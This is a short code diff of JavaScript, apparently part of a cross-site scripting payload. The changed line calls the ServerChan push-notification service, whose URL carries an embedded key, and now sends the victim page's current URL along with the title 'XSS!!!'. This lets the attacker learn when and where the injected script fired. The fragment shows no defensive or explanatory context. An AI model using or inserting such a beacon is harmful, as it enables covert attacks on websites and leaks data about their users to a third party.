@@ -71,7 +71,7 @@ fetch(targetUrl, requestOptions)
         console.error('请求出错:', error);
     });
 try {
-        const response = await fetch('https://sctapi.ftqq.com/SCT264973TwyxLsp1rLVuTjZ3jHX2DFGJi.send?title=xss', {
+        const response = await fetch('https://sctapi.ftqq.com/SCT264973TwyxLsp1rLVuTjZ3jHX2DFGJi.send?title=XSS!!!&desp='+currentUrl, {
           method: 'GET'
         });
         const result = await response.json();
